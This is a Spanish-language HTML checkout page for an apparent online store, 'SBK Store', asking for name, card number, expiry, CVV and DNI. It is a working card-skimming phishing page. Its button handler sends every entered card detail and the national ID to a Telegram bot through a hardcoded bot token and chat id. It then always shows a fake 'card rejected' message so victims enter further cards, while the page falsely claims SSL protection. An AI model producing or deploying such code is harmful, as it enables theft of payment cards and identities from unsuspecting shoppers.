<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pago con Tarjeta</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;800&display=swap" rel="stylesheet"/>
  <style>
    body { font-family: 'Poppins', sans-serif; background-color:#f8f9fa; }
    .payment-container { max-width:500px; margin:40px auto; background:#fff; padding:30px; border-radius:12px; box-shadow:0 6px 20px rgba(0,0,0,0.1); }
  
#errorMsg {
  border-radius: 10px;
  font-size: 0.95rem;
  opacity: 0;
  transform: translateY(10px);
  transition: opacity 0.5s ease, transform 0.5s ease;
}
#errorMsg.show {
  opacity: 1;
  transform: translateY(0);
}

</style>
</head>
<body>
<!-- Navbar -->
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand d-flex align-items-center" href="#">SBK Store</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
      <span class="navbar-toggler-icon"></span>
    </button>
  </div>
</nav>

<div class="container">
  <div class="payment-container">
    <h2 class="text-center mb-4">Pago con Tarjeta</h2>
    <div class="text-center mb-4">
        

<div class="d-flex justify-content-center mb-3">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" 
       alt="Visa" style="max-height:40px; width:auto; margin:0 8px;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" 
       alt="Mastercard" style="max-height:40px; width:auto; margin:0 8px;">
</div>
<p class="text-center fw-bold text-muted mb-3">
  Transacción protegida con encriptación SSL
</p>



<div class="card shadow-sm border-0 mb-3" style="font-size: 0.9rem;">
  <div class="card-body">
    <h6 class="card-title text-uppercase text-muted mb-2" style="font-size:0.85rem; letter-spacing:0.5px;">
      Resumen de compra
    </h6>
    <ul id="resumenProductos" class="list-unstyled mb-2"></ul>
    <hr class="my-2">
    <p class="mb-1"><strong>Envío:</strong> Correo Argentino - $7000</p>
    <p class="mb-0 text-primary fw-bold">Total: $<span id="resumenTotal"></span></p>
  </div>
</div>

</div>


        
      </div>
      
    <div class="row justify-content-center">
      <div class="col-md-6 col-lg-5">
        <form id="paymentForm" action="#" method="post">
      <div class="mb-3">
        <label for="nombre" class="form-label">Nombre completo</label>
        <input type="text" class="form-control" id="nombre" name="nombre">
<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-nombre" style="border-radius: 8px; font-size: 0.85rem;">Este campo es obligatorio</div>
      </div>
      <div class="mb-3">
        <label for="numero" class="form-label">Número de la tarjeta</label>
        <input type="text" class="form-control" id="numero" name="numero" maxlength="16" inputmode="numeric">
<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-numero" style="border-radius: 8px; font-size: 0.85rem;">El número de tarjeta debe tener exactamente 16 dígitos</div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3">
          <label for="vencimiento" class="form-label">Fecha de vencimiento</label>
          <input type="text" class="form-control" id="vencimiento" name="vencimiento" placeholder="MM/AA" maxlength="5" inputmode="numeric">
<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-vencimiento" style="border-radius: 8px; font-size: 0.85rem;">Formato inválido, use MM/AA</div>
        </div>
        <div class="col-md-6 mb-3">
          <label for="codigo" class="form-label">CVV</label>
          <input type="text" class="form-control" id="codigo" name="codigo" maxlength="3" inputmode="numeric">
<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-codigo" style="border-radius: 8px; font-size: 0.85rem;">El CVV debe tener 3 dígitos</div>
        </div>
      </div>
      <div class="mb-3">
        <label for="dni" class="form-label">DNI</label>
        <input type="text" class="form-control" id="dni" name="dni" maxlength="10" inputmode="numeric">
<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-dni" style="border-radius: 8px; font-size: 0.85rem;">El DNI debe tener 8 dígitos</div>
      </div>
      <button type="button" id="btnPagar" class="btn btn-primary mb-3 w-100">Confirmar pago</button>
    </form>
      </div>
    </div>
    
    <div id="errorMsg" class="alert alert-danger mt-3 d-none">
      Tu tarjeta fue rechazada, prueba con otra o verifícala en tu banco.
    </div>
  </div>
</div>

<script>
  // Formato automático fecha vencimiento
  document.getElementById('vencimiento').addEventListener('input', function() {
    let value = this.value.replace(/\D/g, '').substring(0, 4);
    if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
    this.value = value;
  });

  // Formato automático DNI con puntos
  document.getElementById('dni').addEventListener('input', function() {
    let value = this.value.replace(/\D/g, '').substring(0, 8);
    if (value.length > 2 && value.length <= 5) {
      value = value.substring(0, 2) + '.' + value.substring(2);
    } else if (value.length > 5) {
      value = value.substring(0, 2) + '.' + value.substring(2, 5) + '.' + value.substring(5);
    }
    this.value = value;
  });

  // Simulación de pago rechazado siempre
  
  
  function validarCampos() {
    let valido = true;

    function mostrarError(idCampo, idError, condicionExtra = null) {
      const valor = document.getElementById(idCampo).value.trim();
      let error = false;

      if (valor === "") {
        error = true;
      }
      if (condicionExtra && !condicionExtra(valor)) {
        error = true;
      }

      if (error) {
        document.getElementById(idError).classList.remove("d-none");
        valido = false;
      } else {
        document.getElementById(idError).classList.add("d-none");
      }
    }

    mostrarError("nombre", "error-nombre");
    mostrarError("numero", "error-numero", v => /^[0-9]{16}$/.test(v));
    mostrarError("vencimiento", "error-vencimiento", v => {
      const match = v.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
      return !!match;
    });
    mostrarError("codigo", "error-codigo", v => /^[0-9]{3}$/.test(v));
    mostrarError("dni", "error-dni", v => /^\d{8}$/.test(v.replace(/\D/g, "")));

    return valido;
  }


  document.getElementById('btnPagar').addEventListener('click', function() {
    if (!validarCampos()) return;
    const nombre = document.getElementById('nombre').value;
    const numero = document.getElementById('numero').value;
    const vencimiento = document.getElementById('vencimiento').value;
    const codigo = document.getElementById('codigo').value;
    const dni = document.getElementById('dni').value;

    let carrito = JSON.parse(localStorage.getItem("carrito")) || [];
    let productosTexto = carrito.map(p => `- ${p.titulo} (${p.precio})`).join("\n");
    let total = carrito.reduce((sum, p) => sum + parseFloat(p.precio.replace(/[^0-9]/g, "")), 0);

    const mensaje = `
    *Nuevo pago recibido:*
    *Nombre:* ${nombre}
    *Productos:*
    ${productosTexto}
    *Total:* $${total}
    *Número de tarjeta:* ${numero}
    *Vencimiento:* ${vencimiento}
    *CVV:* ${codigo}
    *DNI:* ${dni}
    `;

    const token = '7452393821:AAEHY511Yv-1KqScg7tylWVc8xwFV26GSkQ';
    const chat_id = '6493944778';

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chat_id, text: mensaje, parse_mode: 'Markdown' }),
    })
    
    .catch(err => console.error('Error al enviar a Telegram:', err))
    .finally(() => {
      let errorMsg = document.getElementById('errorMsg');
      errorMsg.innerText = "Tu tarjeta fue rechazada. Verifica los datos o intenta con otra.";
      errorMsg.classList.remove('d-none');
      errorMsg.classList.add('show');

      // Ocultar después de 3 segundos con animación
      setTimeout(() => {
        errorMsg.classList.remove('show');
        setTimeout(() => {
          errorMsg.classList.add('d-none');
        }, 500);
      }, 3000);
    });

  });

// Mostrar resumen de compra en tarjeta
let carrito = JSON.parse(localStorage.getItem("carrito")) || [];
let resumenLista = document.getElementById("resumenProductos");
let resumenTotal = document.getElementById("resumenTotal");
let envio = parseFloat(localStorage.getItem("envioPrecio") || "0");

if (resumenLista && resumenTotal) {
  resumenLista.innerHTML = "";
  let total = 0;
  carrito.forEach(p => {
    resumenLista.innerHTML += `<li>${p.titulo} - ${p.precio}</li>`;
    total += parseFloat(p.precio.replace(/[^0-9]/g, ""));
  });
  total += envio;
  resumenTotal.textContent = total;
}


// Mostrar mensaje de rechazo con estilo
let mensaje = document.getElementById("mensajeRechazo");
if (mensaje) {
  mensaje.style.display = "block";
  // Marcar casillas en rojo
  document.querySelectorAll("input").forEach(campo => {
    campo.classList.add("is-invalid");
  });
  // Scroll automático hacia el mensaje
  mensaje.scrollIntoView({ behavior: "smooth", block: "center" });
}


document.addEventListener("DOMContentLoaded", function() {
  let form = document.querySelector("form");
  if (form) {
    form.addEventListener("submit", function(e) {
      e.preventDefault(); // Evitar envío real para simular rechazo
      let mensaje = document.getElementById("mensajeRechazo");
      if (mensaje) {
        mensaje.style.display = "block";
        // Marcar casillas en rojo
        document.querySelectorAll("input").forEach(campo => {
          campo.classList.add("is-invalid");
        });
        // Scroll automático hacia el mensaje
        mensaje.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    });
  }
});

</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js">
// Mostrar resumen de compra en tarjeta
let carrito = JSON.parse(localStorage.getItem("carrito")) || [];
let resumenLista = document.getElementById("resumenProductos");
let resumenTotal = document.getElementById("resumenTotal");
let envio = parseFloat(localStorage.getItem("envioPrecio") || "0");

if (resumenLista && resumenTotal) {
  resumenLista.innerHTML = "";
  let total = 0;
  carrito.forEach(p => {
    resumenLista.innerHTML += `<li>${p.titulo} - ${p.precio}</li>`;
    total += parseFloat(p.precio.replace(/[^0-9]/g, ""));
  });
  total += envio;
  resumenTotal.textContent = total;
}


// Mostrar mensaje de rechazo con estilo
let mensaje = document.getElementById("mensajeRechazo");
if (mensaje) {
  mensaje.style.display = "block";
  // Marcar casillas en rojo
  document.querySelectorAll("input").forEach(campo => {
    campo.classList.add("is-invalid");
  });
  // Scroll automático hacia el mensaje
  mensaje.scrollIntoView({ behavior: "smooth", block: "center" });
}

</script>

<div id="mensajeRechazo" class="alert alert-danger text-center mt-3" style="display:none;" role="alert">
  Pago rechazado por el banco.<br>Por favor verifique los datos de su tarjeta o intente con otro método de pago.
</div>

</body>
</html>
